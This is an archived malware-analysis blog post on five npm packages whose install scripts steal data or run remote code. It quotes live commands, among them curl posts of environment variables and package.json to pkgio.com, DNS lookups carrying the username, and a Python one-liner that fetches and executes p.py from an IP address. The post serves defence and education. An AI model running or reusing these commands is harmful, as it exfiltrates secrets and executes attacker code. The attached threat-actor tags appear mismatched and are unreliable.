{
    "id": "eb90510a-c2cb-4f5b-b32e-0a209015a5de",
    "created_at": "2023-06-05T02:07:15.884539Z",
    "updated_at": "2025-03-27T02:17:05.689305Z",
    "deleted_at": null,
    "sha1_hash": "342df12d0d3b452577141da477d59d31a5744f65",
    "title": "2023-04-15 - Dissecting Npm Malware- Five Packages And Their Evil Install Scripts",
    "authors": "",
    "file_creation_date": "2023-06-04T12:39:50Z",
    "file_modification_date": "2023-06-04T12:39:50Z",
    "file_size": 482384,
    "plain_text": "# Dissecting Npm Malware: Five Packages And Their Evil Install Scripts\n\n**[blog.sandworm.dev/dissecting-npm-malware-five-packages-and-their-evil-install-scripts](https://blog.sandworm.dev/dissecting-npm-malware-five-packages-and-their-evil-install-scripts)**\n\nGabi Dobocan\n\nPlay this article\nYour browser does not support the audio element.\nPackages published on npm can declare pre and post-install hooks, which are scripts that\nrun, well, pre or post-install. That is to say, when the npm CLI installs a package, it also runs\nthose scripts on your machine.\n\n_It runs them silently, in the background._\n\n**Sounds like a bad idea? It kinda is.**\n\n## When Are Install Scripts Useful?\n\nAccording to npm's [best practices, rarely:](https://docs.npmjs.com/cli/v9/using-npm/scripts#best-practices)\n\nDon't use install. Use a .gyp file for compilation, and prepare for anything else. You\nshould almost never have to explicitly set a preinstall or install script. If you are doing\nthis, please consider if there is another option. The only valid use of install or\n```\n  preinstall scripts is for compilation which must be done on the target architecture.\n\n```\nIn practice, these scripts can be very useful for automating tasks that need to be done every\ntime a package is installed or updated. They can help ensure that the package is\n**installed correctly and that any necessary setup or configuration tasks are completed**\n**automatically. For example, a preinstall script might check that certain dependencies are**\ninstalled or that the environment is set up correctly, while a post-install script might compile\nassets or configure a database.\n\n## How Can Install Scripts Hurt You\n\nHowever, there are some risks associated with using pre and post-install scripts. For\nexample, a malicious package could include a preinstall script that could harm the user's\nsystem. Additionally, running arbitrary code during the installation process could\npotentially introduce security vulnerabilities or cause unexpected behavior.\n\nLet's see just how much of a bad idea install scripts can be, by looking at five packages that\nhave been pulled from the registry for doing nasty things.\n\n### Packages Can Silently Leak Your Private Data\n\n\n-----\n\n[https://www.npmjs.com/package/micro-username](https://www.npmjs.com/package/micro-username)\n```\nmicro-username is a package that has been live in the registry for about two days, in\n\n```\nFebruary 2023. While it was available, it published 28 versions, with descriptions ranging\nfrom this is for micro-soft to Simple PoC package for testing for dependency\n```\nconfusion vulnerabilities.\n\n```\nThe pre-install script for the package attempted to silently exfiltrate data:\n\nThis script pings a URL that is constructed using several commands that expose private\ninformation about your development machine:\n```\n   whoami returns the current username or the user ID (UID) associated with the current\n\n```\nuser. In many cases, this might be the actual name of the user;\n```\n   pwd returns the current working directory, which is the directory that the user is currently\n\n```\nin or working from. This reveals details about the path structure of the current machine;\n```\n   hostname returns the name that has been assigned to the computer or device that\n\n```\nyou're using. This name can be a fully qualified domain name (FQDN), which includes\nthe domain name and the host name, or it can be just the host name.\n\nThe --quiet option for wget is a command-line option that instructs wget to work in silent\nmode, which means that it suppresses all output except for the basic progress indicators.\n\n[https://www.npmjs.com/package/@primeo/address](https://www.npmjs.com/package/@primeo/address)\n```\n@primeo/address was live for four days in December 2021, and only had a single version,\n\n```\nbut with a very elaborate install script:\n\n1. nslookup $(whoami).u.pkgio.com: This command looks up the IP address associated\n\nwith the hostname $(whoami).u.pkgio.com using the nslookup tool.\n\n\n-----\n\n2. nslookup $(uname --nodename).h.pkgio.com: This command looks up the IP\n\naddress associated with the hostname $(uname --nodename).h.pkgio.com using the\n```\n   nslookup tool. The uname --nodename command is used to determine the current\n\n```\nmachine's hostname, which is then used to construct the hostname.\n\n3. curl -X POST -d @package.json -H 'X-BOT: nope'\n```\n   https://www.pkgio.com/.x773/package.json: This command sends an HTTP POST\n\n```\nrequest with the body set to the contents of the file package.json, specified by the -d\noption. This basically sends out the content of your app's manifest file.\n\n4. env > /tmp/.env ; curl -X POST -d @/tmp/.env -H 'X-BOT: nope'\n```\n   https://www.pkgio.com/.x773/env.json: This command writes the current\n\n```\nenvironment variables to the file /tmp/.env, using the env command. It then sends an\nHTTP POST request with the body set to the contents of the file /tmp/.env, specified\nby the -d option. This would, in effect, leak all of your private environment\n**variables to an unknown actor.**\n\n[https://www.npmjs.com/package/@ovh-ui/oui-checkbox](https://www.npmjs.com/package/@ovh-ui/oui-checkbox)\n```\n@ovh-ui/oui-checkbox was live for about a week in June 2022 and seems to be part of a\n\n```\nbug bounty program by French company Sekost. It tried to further evade detection by using\nDNS requests instead of HTTP:\n\nWhen you run the dig command with a domain name, it sends a DNS query to a DNS server\nand retrieves the corresponding DNS records for that domain. This can be useful for\ntroubleshooting DNS issues, verifying DNS configurations, or performing DNS\nreconnaissance.\n\nHowever, dig can also be used by malware for malicious purposes. Malware can use dig to\nexfiltrate data from a compromised system. By using DNS queries as a covert channel,\nmalware can bypass traditional security controls and avoid detection by security tools that\nrely on IP addresses. The same goes for the nslookup usage in the example above.\n\nIn addition, malware can use dig to perform DNS tunneling, which is a technique that allows\nattackers to bypass firewalls and other security controls by using DNS queries and\nresponses to transmit data between the attacker's system and a C&C server.\n\n### Packages Can Remotely Run Scripts For Full Access To Your Machine And Data\n\n\n-----\n\n[https://www.npmjs.com/package/node-hsf](https://www.npmjs.com/package/node-hsf)\n```\nnode-hsf was live for a full month in 2018 and tried to masquerade as an open-source library\n\n```\n[from Alibaba by providing a fake repo URL, under the https://github.com/alibaba/](https://github.com/alibaba/)\norganization. The authors published seven versions in total, each exploring different ways of\nexploiting pre-install scripts, including downloading and running Python code.\n\nVersion 1.3.3 implemented a naive approach by using wget to download a Python script and\nsave it to the user's home directory, as a hidden file, inconspicuously named .vim.hint:\n\nBy version 1.3.4 though, the pre-install script got a bit smarter:\n\nHere is a breakdown of what the command above does:\n```\n   nohup runs the command in the background and allows the script to continue running\n\n```\neven if the terminal is closed.\n```\n   python is the interpreter used to execute the Python code.\n   -c indicates that the following argument should be treated as a command to be\n\n```\nexecuted.\n```\n   'import urllib;exec\n   urllib.urlopen(\"http://121.196.214.81:8083/p.py\\\").read()' is a single line of\n\n```\nPython code that imports the urllib library and uses it to download and execute a\n**Python script located at the URL http://121.196.214.81:8083/p.py.**\n```\n   & is a shell operator that runs the preceding command in the background, allowing the\n\n```\nterminal to be used for other commands.\n\n[https://www.npmjs.com/package/alicov](https://www.npmjs.com/package/alicov)\n```\nalicov was live for about a month in 2018 and published 15 versions in total. It used a\n\n```\nconvoluted install script to mask its malicious intents:\n\n\n-----\n\nThis Python script defines a lambda function that performs a malicious action, specifically\nrequesting a potentially dangerous URL. The lambda function is defined using a nested\n```\n__contextlib.nested() function, which creates a context manager to handle the cleanup of\n\n```\nresources.\n\nThe lambda function is executed immediately with the (__import__('urllib', __g, __g,\n```\n('urlopen',), 0)) argument, which imports the urllib module and then calls its urlopen\n\n```\nfunction to open, compile, and evaluate the code under the potentially dangerous URL.\n\nAfter that, the script prints a message indicating that it is a fake package and warns the user\nnot to use NPM to get the right one?! It seems like a warning or a prank script intended to\ndemonstrate the dangers of running untrusted code.\n\n## Any npm install Comes With A Risk\n\nWhile researching this article, it was easy to identify many packages that have declared\nmalicious install scripts directly in their package.json manifest. However, that is a naive\napproach, and most malware does a much better job of hiding and obfuscating sensitive\ncode. Around 700k package versions in the npm registry currently declare install\n**scripts, and could thus execute code that compromises the security of your dev**\n**machine, or your CI build. More are added every day.**\n\nTo mitigate this risk, it's important for JavaScript developers to carefully review the install\nscripts of the packages they use and to only install packages from trusted sources.\n[Developers should also consider using tools like sandworm audit to](https://blog.sandworm.dev/the-better-npm-audit) identify any security\nvulnerabilities in their dependencies and stay up to date with security updates.\n\n**If you enjoyed this article, have a look at Sandworm to keep your JavaScript project**\n**safe!** ðŸ‘‡\n\n\n-----\n\n[https://github.com/sandworm-hq/sandworm-audit](https://github.com/sandworm-hq/sandworm-audit)\n\n**_[Sandworm Audit](https://github.com/sandworm-hq/sandworm-audit)_** **_is the open-source_** `npm audit` _that doesnâ€™t suck: it checks for_\n_multiple types of issues, like vulnerabilities or license compliance, it outputs SVG_\n_charts and CSVs, it can mark issues as resolved, and you can also run it in your CI to_\n_enforce security rules._ **_[Check the docs](https://docs.sandworm.dev/)_** _and_ `npx @sandworm/audit@latest` _in your_\n_JavaScript appâ€™s root to try it out ðŸª±._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-15 - Dissecting Npm Malware- Five Packages And Their Evil Install Scripts.pdf"
    ],
    "report_names": [
        "2023-04-15 - Dissecting Npm Malware- Five Packages And Their Evil Install Scripts.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1685930835,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1685882390,
    "ts_modification_date": 1685882390,
    "files": {
        "pdf": "https://archive.orkl.eu/342df12d0d3b452577141da477d59d31a5744f65.pdf",
        "text": "https://archive.orkl.eu/342df12d0d3b452577141da477d59d31a5744f65.txt",
        "img": "https://archive.orkl.eu/342df12d0d3b452577141da477d59d31a5744f65.jpg"
    }
}